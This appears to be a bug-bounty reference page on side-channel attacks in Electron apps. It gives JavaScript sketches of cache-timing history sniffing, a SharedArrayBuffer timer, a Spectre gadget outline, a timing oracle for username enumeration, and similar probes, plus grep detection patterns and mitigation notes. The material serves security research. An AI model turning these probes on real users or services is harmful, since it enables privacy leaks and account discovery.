---
title: Side-Channel Sources
description: Timing attacks, memory observation, and indirect information leakage in Electron apps
---

# Side-Channel Sources

Side-channel sources don't directly inject data into application logic — they extract information through indirect observation: timing, memory, power, or behavioral differences. In Electron, side-channels are enabled by the rich environment the app runs in (V8 JIT, high-resolution timers, shared memory).

---

## High-Resolution Timing

JavaScript's `performance.now()` provides sub-millisecond timing, enabling cache-timing attacks:

```javascript
// Cache timing attack pattern:
function timingAttack(targetUrl) {
  // Probe whether the user has visited a URL (browser history attack):
  const img = new Image();
  const start = performance.now();
  img.onload = img.onerror = () => {
    const elapsed = performance.now() - start;
    // Cached → fast (~0ms) | Not cached → slow (~100ms+)
    if (elapsed < 10) {
      console.log('User has visited:', targetUrl);
    }
  };
  img.src = targetUrl;
}
```

### SharedArrayBuffer High-Resolution Timer

Even with `performance.now()` precision reduced (as a Spectre mitigation), `SharedArrayBuffer` + `Atomics` can reconstruct a high-resolution timer:

```javascript
// From a Worker:
const sharedBuffer = new SharedArrayBuffer(8);
const sharedArray = new BigInt64Array(sharedBuffer);

// Increment timer in tight loop:
function timerWorker() {
  while (true) {
    Atomics.add(sharedArray, 0, 1n);
  }
}

// Main thread reads counter for precise timing:
const start = Atomics.load(sharedArray, 0);
// ... probe operation ...
const elapsed = Atomics.load(sharedArray, 0) - start;
// → effectively nanosecond-resolution timer
```

**Electron relevance:** Electron 15+ supports `crossOriginIsolated` mode, which enables `SharedArrayBuffer`. When a site sets `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp`, it gets `SharedArrayBuffer` access — including the timer reconstruction.

---

## Spectre / Transient Execution

In Chromium-based renderers (including Electron's), Spectre-class attacks can read cross-site data through speculative execution:

```javascript
// Simplified Spectre gadget structure:
const array1 = new Uint8Array(256);
const array2 = new Uint8Array(65536);
const secretOffset = /* cross-origin address */;

// Train branch predictor:
for (let i = 0; i < 100; i++) {
  spectreTrain(i % array1.length);
}

// Attack:
if (x < array1.length) {          // Branch predicted true (mispeculated)
  const secretByte = array1[x];  // x out of bounds → speculative access
  array2[secretByte * 256];       // Encode secret in cache
}

// Measure cache to recover secret byte
```

**Practical impact in Electron:** Spectre attacks are mitigated in browsers but Electron's threat model includes local attacker scenarios where mitigation bypass may be possible, especially when the renderer is less isolated.

---

## V8 JIT Side Channels

The V8 JIT compiler's optimization decisions can be observed:

```javascript
// JIT timing: determine if a value equals a secret by measuring deoptimization:
function hotPath(x) {
  return x * 2;  // JIT optimizes assuming x is always a number
}

// Train with numbers:
for (let i = 0; i < 10000; i++) hotPath(42);

// Probe with string (forces deopt if JIT assumed number):
const start = performance.now();
hotPath("probe");
const elapsed = performance.now() - start;
// Deopt (slower) → value was not what JIT expected
// Can be used to probe type assumptions about secret values
```

---

## CSS Timing Attacks

CSS can be used for timing attacks in the renderer:

```javascript
// CSS history sniffing (mitigated in modern browsers but relevant in some Electron versions):
const link = document.createElement('a');
link.href = 'https://target.com/login';
document.body.appendChild(link);

// getComputedStyle timing:
const start = performance.now();
const color = getComputedStyle(link).color;
const elapsed = performance.now() - start;
// Visited links may have different colors → timing difference
```

---

## Power Analysis via Battery API

```javascript
// Battery API (deprecated in modern Chrome but may exist in older Electron versions):
navigator.getBattery().then(battery => {
  const level = battery.level;      // SOURCE: battery level (privacy fingerprint)
  const charging = battery.charging; // SOURCE: charging state
  
  // Battery status can be used to fingerprint/correlate users across sites
  // Not a direct exploit but a privacy leak
});
```

---

## Resource Timing API

```javascript
// Measure response timing of cross-origin resources:
performance.getEntriesByType('resource').forEach(entry => {
  console.log(entry.name, entry.duration);
  // entry.name — URL of resource
  // entry.duration — timing (SOURCE: reveals whether resource was cached)
  
  // Can infer visited URLs from cache timing via redirects or subrequest timing
});
```

---

## Memory Usage Side Channels

JavaScript heap size can reveal information:

```javascript
// performance.memory (Chrome/Electron extension):
const heapBefore = performance.memory?.usedJSHeapSize;
// ... trigger operation that processes secret data ...
const heapAfter = performance.memory?.usedJSHeapSize;
const diff = heapAfter - heapBefore;
// Heap growth reveals size of processed secret (string length, object count, etc.)
```

---

## Network Timing

In Electron apps that make authenticated requests, timing responses can leak state:

```javascript
// Timing-based oracle:
async function usernameExists(username) {
  const start = performance.now();
  await fetch(`/api/check-user?name=${username}`);
  return performance.now() - start;
  // If server does bcrypt on valid usernames but returns immediately for invalid:
  // Valid user → ~200ms (bcrypt) | Invalid → ~5ms (no bcrypt) → user enumeration
}
```

---

## Practical Impact in Bug Bounty

Side-channel bugs in Electron apps are typically:

| Attack | Practical Impact | Bounty Tier |
|--------|-----------------|-------------|
| History sniffing via CSS/Timing | Privacy violation | Low-Medium |
| Cross-origin data via Spectre | Data exfiltration | High (if practical) |
| User enumeration via timing | Account discovery | Medium |
| SharedArrayBuffer timer | Enables other attacks | Medium (as primitive) |
| JIT timing oracle | Key/secret bits | High (if key recovery) |

---

## Detection Patterns

```bash
# Find SharedArrayBuffer usage:
grep -rn "SharedArrayBuffer\|Atomics\." --include="*.js" . | grep -v node_modules

# Find high-resolution timer usage:
grep -rn "performance\.now()\|hrtime\|BigInt(Date" --include="*.js" . | grep -v node_modules

# Find timing-sensitive operations:
grep -rn "performance\.now()\|hrtime" --include="*.js" . -B 2 -A 2 | \
  grep -v node_modules | grep "crypt\|hash\|verify\|auth\|password" | head -20

# Find performance.memory usage:
grep -rn "performance\.memory\|usedJSHeapSize" --include="*.js" . | grep -v node_modules

# Find resource timing API:
grep -rn "getEntriesByType\|PerformanceObserver" --include="*.js" . | grep -v node_modules
```

---

## Mitigation Notes

Side-channel attacks in Electron are partially mitigated by:

- `performance.now()` precision reduction (100µs in some configurations)
- `crossOriginIsolated` requirements for `SharedArrayBuffer`
- Site isolation (process-per-site)
- Spectre mitigations in V8 (but not fully eliminated)

For bug bounty purposes, demonstrate practical exploitability — theoretical Spectre without a working PoC is typically rated low.
